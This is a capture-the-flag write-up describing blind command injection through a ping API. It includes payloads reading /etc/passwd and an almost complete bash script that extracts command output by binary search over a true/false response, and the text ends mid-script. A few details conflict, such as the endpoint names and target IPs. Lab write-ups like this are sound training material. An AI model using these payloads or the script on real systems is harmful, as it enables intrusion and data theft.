# Operation SICKOMODE CTF

## CTF 
The goal of the CTF was to defuse a bomb by entering a provided code on the defuser website. Initial access was provided to the controller server at https://192.168.20.177.

## Initial Access and Scanning
After running an nmap scan and durbuster on 192.168.20.177, I found the "/development" URI. This website provided a text box that says "This bay does one thing: it pings a target and tells you if it’s alive. No extra diagnostics. No noise. Just signal."

When you enter something into the text field, it appears to use `/api/ping`, which sends a ping to the specified host and return whether the host is up or down.

```
GET /api/pulse?ip=127.0.0.1 HTTP/1.1
{"ok":true,"ip":"127.0.0.1","up":true,"rtt_ms":null,"reason":"ok","elapsed_ms":2,"checked_at":1773555009}
```

## Blind Command Injection
Since I had seen ping used in other CTFs as a vehicle for command injection, my first thought was to try payloads such as `; cat /etc/passwd`, `$(cat /etc/passwd)`, or `\`cat /etc/passwd\``

Unfortunately, all these commands seem to do was echo the command back to me and then say the host was down. However, after playing around a bit, I did notice an interesting pattern. Injected commands that seemed to be valid bash commands would return "Host Up" and commands that were invalid returned "Host down".

```
# Command 'which ping' returns "up":true
GET /api/pulse?ip=%3B%20which%20ping HTTP/1.1
{"ok":true,"ip":"; which ping","up":true,"rtt_ms":null,"reason":"ok","elapsed_ms":3,"checked_at":1773555353}
# Command 'which pong' returns "up":false
GET /api/pulse?ip=%3B%20which%20pong HTTP/1.1
{"ok":true,"ip":"; which pong","up":false,"rtt_ms":null,"reason":"no response","elapsed_ms":3,"checked_at":1773555419}
```

This tells me two things: 
1. The commands I run are likely being executed on the target system, I just can't see the results.
2. I can potentially use boolean inference to read the output of commands one character at a time.

Using AI to help, I wrote a bash script that took a command, piped it to base 64, took one character at a time in a for loop, and then iterated over all of the ASCII characters until the character was discovered. Up to 128 requests were made to the server for each base 64 character of output. I quickly realized this would not be a viable solution, especially because the server was implementing rate limiting.

```
[*] Starting binary search extraction for: whoami
{"ok":true,"ip":"; [ $(whoami | base64 -w 0 | cut -c 1 | tr -d '\\n' | od -An -tu1) -gt 63 ]","up":true,"rtt_ms":null,"reason":"ok","elapsed_ms":7,"checked_at":1773555566}
{"detail":"Slow down"}
```

Using a little guess and check, I determined the fastest time between requests without gettring `{"detail": "Slow down"}` was 0.6 seconds. I also worked in a binary search algorithm to bring the requests per character down to log(128)= maximum of 8 requests per character. It still wasn't ideal, but it was enough to uncover some additional information to make command execution easier.

Here is the full binary search script:
```
#!/bin/bash

TARGET_URL="https://192.168.20.177/api/pulse"
CMD_TO_EXTRACT="pwd"

echo "[*] Starting binary search extraction for: $CMD_TO_EXTRACT"
EXTRACTED_B64=""

# Base64 string can be long, adjust maximum range if needed
for (( i=1; i<=5000; i++ )); do
    LOW=0
    HIGH=127

    # Binary search loop (takes exactly 7 requests per character)
    while [ $LOW -lt $HIGH ]; do
        MID=$(( (LOW + HIGH) / 2 ))

        # Payload asks: Is the ASCII value of the $i-th character greater than $MID?
        # 'od -An -tu1' converts the single character into its decimal ASCII integer.
        PAYLOAD="; [ \$($CMD_TO_EXTRACT | base64 -w 0 | cut -c $i | tr -d '\n' | od -An -tu1) -gt $MID ]"

        RESPONSE=$(curl -s -k -G \
            -H 'Host: 192.168.17.176' \
            -H 'Sec-Ch-Ua-Platform: "Linux"' \
            -H 'Accept-Language: en-US,en;q=0.9' \
            -H 'Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"' \
            -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36' \
            -H 'Sec-Ch-Ua-Mobile: ?0' \
            -H 'Accept: */*' \
            -H 'Sec-Fetch-Site: same-origin' \
            -H 'Sec-Fetch-Mode: cors' \
            -H 'Sec-Fetch-Dest: empty' \
            -H 'Referer: https://192.168.17.176/development' \
            -H 'Accept-Encoding: gzip, deflate, br' \
            -H 'Connection: keep-alive' \
            --data-urlencode "ip=$PAYLOAD" \
            "$TARGET_URL")

        sleep 0.6

        # If the oracle returns success ("up":true), the ASCII value IS greater than MID
        if echo "$RESPONSE" | grep -q '"up":true' || echo "$RESPONSE" | grep -q '"up": true'; then
            LOW=$(( MID + 1 ))
        else
            HIGH=$MID
        fi
    done

    # If LOW resolves to 0, 'od' returned nothing, meaning we hit the end of the string
    if [ $LOW -eq 0 ]; then
        echo -e "\n[*] End of output reached."
        break
    fi

    # Convert the decimal ASCII value back into a character safely using octal
    OCTAL=$(printf '%03o' $LOW)
    CHAR=$(printf "\\$OCTAL")
```
